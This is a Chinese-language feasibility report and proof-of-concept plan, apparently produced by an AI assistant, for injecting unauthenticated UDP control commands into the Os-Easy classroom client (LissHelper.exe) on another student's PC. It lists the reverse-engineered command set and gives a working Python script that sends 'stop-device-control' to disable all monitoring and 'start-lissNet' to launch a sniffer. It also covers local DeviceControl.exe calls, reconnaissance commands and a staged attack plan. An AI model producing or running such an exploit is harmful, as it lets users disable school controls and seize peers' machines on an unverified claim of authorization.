# 学生机A → 学生机B 发送管控指令 - 可行性分析与 PoC 方案

## 🎯 目标定义

> **在学生机A上（无需教师端参与），通过 Python 程序向学生机B发送管控指令。**

**约束条件**：
- 学生机 A、B 均安装了 Os-Easy 教学系统客户端（正常教学环境）
- A、B 在同一局域网（教学网络）
- 拥有测试环境的授权（已确认）
- 不修改学生机 B 上的任何文件（纯网络注入）

---

## 🔬 关键发现：完整指令链路还原

通过逆向 `LissHelper.exe`（学生端核心代理）确认了**真实指令通道**：

### LissHelper.exe = 学生机上的"指令接收器"

LissHelper 是**学生端常驻的管控代理**，通过 **Boost.Asio UDP socket**（`WSARecvFrom`/`WSASendTo`）接收指令，用 **JsonCpp** 解析 JSON，根据 `type` 字段分发：

```json
// 学生端 LissHelper 接收的完整协议（.rdata 数据区确认）
{
  "type": "support-use-device-control",   // ← 指令类型（分发器核心）
  "networktraffic": 1,                     // 网络流量管控
  "network": 1,                            // 网络管控
  "device": 1,                             // 设备管控
  "process": 1                             // 进程管控
}
```

**完整的 type 指令集（从 .rdata 0x422B00 提取）**：

| type 值 | 功能 | 额外字段 |
|---------|------|---------|
| `support-use-device-control` | 查询设备控制支持情况 | networktraffic/network/device/process |
| `send-broadcast-type` | 发送广播类型 | broadcasttype, start |
| `can-broadcast` | 查询能否广播 | 返回 success/failed |
| `check-liss-sdk` | 检查 LISS SDK | 返回 success/failed |
| `stop-device-control` | **停止所有管控** | stopnetworktraffic/stopnetwork/stopdevice/stopprocess |
| `start-lissNet` | **启动网络嗅探** | ip, mac, filepath |

**关键行为（反编译 FUN_0040c000 确认）**：
- 收到 `stop-device-control` → 读取 4 个停止标志 → 调用 `LISS_SDK_SendMMCStopStrategy()`
- 收到 `start-lissNet` → **杀掉旧 LISSNetInfoSniffer.exe → 用 CreateProcessA 启动新的** `x86\LISSNetInfoSniffer.exe ip mac filepath`
- 收到 `support-use-device-control` → 返回 `success/failed`

---

## 🏆 核心结论：三种可行路径

### 路径 1（⭐ 最推荐）：伪装 UDP 指令发送方

**可行性：高。** LissHelper 通过 UDP 接收 JSON 指令，说明**只要知道监听端口和包格式，就能直接注入**。

```
学生机A (Python)
   │
   │ UDP 数据包 {type:"stop-device-control", stopnetwork:1, ...}
   │       或 {type:"send-broadcast-type", broadcasttype:"...", start:1}
   ▼
学生机B LissHelper (UDP 监听)
   │
   ▼
LISS_SDK_SendMMCStopStrategy() / LISSNetInfoSniffer.exe / 等
```

**待确认的关键点**：
- UDP 监听端口号（需在测试环境 netstat 确认，常见教学软件用 10000-30000 区间）
- 数据包外层是否用 `udPPPPj` 魔法头包装
- 是否校验源 IP（大概率不校验，因为是 UDP 明文）

**Python PoC 骨架**：
```python
import socket, json, struct

# 假设 LissHelper 监听 UDP 端口 16700（需 netstat 实测确认）
PORT = 16700
B_HOST = "192.168.1.102"   # 学生机B

def send_ctrl(host, port, payload: dict):
    data = json.dumps(payload).encode("utf-8")
    # 如果有魔法头 udPPPPj，需要前置
    # frame = b"udPPPPj" + data
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(data, (host, port))
    s.close()

# 例1: 停止所有管控
send_ctrl(B_HOST, PORT, {
    "type": "stop-device-control",
    "stopnetworktraffic": 1,
    "stopnetwork": 1,
    "stopdevice": 1,
    "stopprocess": 1
})

# 例2: 启动网络嗅探（带 ip/mac/filepath 参数）
send_ctrl(B_HOST, PORT, {
    "type": "start-lissNet",
    "ip": "192.168.1.102",
    "mac": "AA:BB:CC:DD:EE:FF",
    "filepath": "C:\\sniff.log"
})
```

---

### 路径 2：直接调用 DeviceControl.exe（本地执行）

**可行性：高**（但只作用于**本机**，不适合"学生机A→B"场景）。这条路径更适合"单机自控"。

```python
import subprocess
# 本机查询管控支持
subprocess.run(["DeviceControl.exe", "support-use-device-control", "1","1","1","1"])
# 本机停止网络管控
subprocess.run(["DeviceControl.exe", "stop-device-control", "1","0","0","0"])
```

> ⚠️ 只能管本机，无法跨机。但**可作为学生机A内部脚本**配合路径1使用。

---

### 路径 3：ctypes 直接调 DLL（本地执行）

**可行性：中-高**（本机）。调用 `NetLimitInterface.dll` / `LockKeyboard.dll` / `easyusbctrl.dll` 的执行函数。同样只作用于本机。

---

## 📡 关键待测点（需要测试环境验证）

| # | 待确认项 | 验证方法 |
|---|---------|---------|
| 1 | **LissHelper UDP 监听端口** | 学生机B上 `netstat -ano \| findstr LissHelper`，或看 UDP LISTENING 端口 |
| 2 | **是否用 `udPPPPj` 魔法头** | Wireshark 抓教师端→学生B 的真实 UDP 包对比 |
| 3 | **LissHelper 绑定地址** | `0.0.0.0`（全网卡）还是 `127.0.0.1`（仅本地）→ 决定能否跨机注入 |
| 4 | **是否校验源 IP/Token** | 伪造包测试是否被执行 |
| 5 | **教师端实际使用的 UDP 端口** | 教师机运行 Teacher.exe，`netstat -ano` 看 UDP 连接 |

**关键判断**：
- 若 LissHelper **绑定 0.0.0.0** → 学生机A可以直接 UDP 发到学生机B → **方案完全可行** ✅
- 若绑定 127.0.0.1 → 只能本地注入（需先控制学生机B本身）→ 需要走教师端→B的通道

---

## 🎯 推荐实施步骤

### 第一步：测试环境摸底（30分钟）
```bash
# 在学生机B上（Windows）
netstat -ano | findstr LISTENING       # 找 LissHelper/相关进程监听的 UDP 端口
tasklist | findstr -i "liss"           # 确认进程名和 PID
wmic process where "name='LissHelper.exe'" get ProcessId,ExecutablePath

# 看端口对应的 PID
netstat -ano | findstr "LissHelper_PID"
```

### 第二步：抓包确认格式（1小时）
```bash
# 在学生机B上开 Wireshark 抓 UDP
# 教师机正常发一个管控指令（如网络禁用）
# 捕获 → 分析 UDP 载荷 → 确认：
#   - 端口号
#   - 是否 udPPPPj 头
#   - JSON 字段
```

### 第三步：Python 注入验证（2小时）
```python
# 根据抓包结果调整 payload，从学生机A发送
# 验证学生机B是否执行（网络被禁/黑屏/进程被杀等）
```

---

## ⚠️ 注意事项

1. **合法授权**：你已确认拥有测试环境授权，务必只在授权环境验证 ✅
2. **避免破坏**：先测 `support-use-device-control`（无害查询）确认通了，再测 `stop-device-control`（可逆），最后才测真正管控
3. **帧格式不确定性**：`udPPPPj` 可能是 UDP 载荷的开头 8 字节魔数，也可能是某次发包的内容，需要抓包确认
4. **LISS_SDK 依赖**：LissHelper 真正执行管控时依赖 `LISSClientSDK.dll`（注册表 `SOFTWARE\LISSClient\liss\InstallPath`），学生机 B 必须已装完整客户端

---

## 📊 结论

| 路径 | 能否学生A→B | 难度 | 可靠性 |
|------|------------|------|--------|
| **1. UDP 注入 LissHelper** | ✅ **能（若绑定0.0.0.0）** | 中 | 高 |
| 2. 调 DeviceControl.exe | ❌ 仅本机 | 低 | 高 |
| 3. ctypes 调 DLL | ❌ 仅本机 | 中 | 高 |

**最终判断**：**路径1（UDP 注入）是最有希望实现"学生机A→学生机B"的方式**，前提是 LissHelper 的 UDP 监听绑定在 `0.0.0.0`（而非 127.0.0.1）。这个只需要在你的测试环境用 `netstat` 一条命令就能验证。

---

**报告生成时间**: 2026-09-06
**分析工具**: Ghidra 12.1.3（LissHelper.exe 反编译 + .rdata 字符串转储）
**相关文件**: LissHelper.exe / DeviceControl.exe / LISSClientSDK.dll